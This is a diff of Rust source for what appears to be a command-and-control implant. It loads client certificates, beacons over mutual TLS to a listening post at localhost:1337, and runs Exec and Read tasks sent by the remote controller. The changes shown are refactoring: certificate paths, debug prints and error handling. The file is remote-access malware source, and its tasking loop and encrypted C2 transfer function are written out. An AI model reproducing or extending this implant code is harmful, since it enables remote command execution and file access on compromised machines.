@@ -2,11 +2,7 @@
 use std::{
     collections::HashMap,
     fs::{self, File},
-    io::{
-        self,
-        ErrorKind::{self, Other},
-        Read, Write,
-    },
+    io::{self, Read, Write},
     net::{TcpStream, ToSocketAddrs},
     os::unix::process::CommandExt,
     process::{ChildStderr, ChildStdin, ChildStdout},
@@ -31,12 +27,12 @@ use rustls::{
 type Handles = Mutex<HashMap<u64, Handle>>;
 
 fn main() {
-    let ca_cert = fs::read("./ca.pem").unwrap().leak();
-    let client_cert = fs::read("./client.crt").unwrap().leak();
-    let client_key = fs::read("./client.key").unwrap().leak();
-    println!("{ca_cert:?}\n\n{client_cert:?}\n\n{client_key:?}");
+    let ca_cert = fs::read("./crypto/ca.crt").unwrap().leak();
+    let client_cert = fs::read("./crypto/client.crt").unwrap().leak();
+    let client_key = fs::read("./crypto/client.key").unwrap().leak();
+
     let (tx, rx) = start_callback(
-        "c2",
+        "lp",
         Duration::from_secs(5),
         "localhost:1337",
         ca_cert,
@@ -50,9 +46,11 @@ fn main() {
     while let Ok(Request { session, seq, req }) = rx.recv() {
         match req {
             request::RequestType::Exec(exec) => {
+                println!("Got Exec");
                 do_exec(exec, session, seq, &handles, tx.clone());
             }
             request::RequestType::Read(read) => {
+                println!("Got Read");
                 do_read(read, session, seq, &handles, tx.clone());
             }
             _ => println!("Unsupported type"),
@@ -211,7 +209,7 @@ impl Read for Handle {
         match self {
             Handle::File(file) => file.read(buf),
             Handle::Socket(tcp_stream) => tcp_stream.read(buf),
-            Handle::StdIn(_) => Err(ErrorKind::Other.into()),
+            Handle::StdIn(_) => Err(io::ErrorKind::Other.into()),
             Handle::StdOut(child_stdout) => child_stdout.read(buf),
             Handle::StdErr(child_stderr) => child_stderr.read(buf),
         }
@@ -224,8 +222,8 @@ impl Write for Handle {
             Handle::File(file) => file.write(buf),
             Handle::Socket(tcp_stream) => tcp_stream.write(buf),
             Handle::StdIn(child_stdin) => child_stdin.write(buf),
-            Handle::StdOut(_) => Err(ErrorKind::Other.into()),
-            Handle::StdErr(_) => Err(ErrorKind::Other.into()),
+            Handle::StdOut(_) => Err(io::ErrorKind::Other.into()),
+            Handle::StdErr(_) => Err(io::ErrorKind::Other.into()),
         }
     }
 
@@ -292,7 +290,6 @@ fn start_callback(
                 }
                 Err(_) => {
                     error_count += 1;
-                    println!("Error");
                     if error_count > 5 {
                         break 'main;
                     }
@@ -339,6 +336,7 @@ fn transfer_c2(
     let mut stream = rustls::Stream::new(ctx, &mut tcp_conn);
 
     bincode::encode_into_std_write(responses, &mut stream, bincode::config::standard())
-        .or(Err(Other))?;
-    bincode::decode_from_std_read(&mut stream, bincode::config::standard()).or(Err(Other.into()))
+        .map_err(io::Error::other)?;
+    bincode::decode_from_std_read(&mut stream, bincode::config::standard())
+        .map_err(io::Error::other)
 }
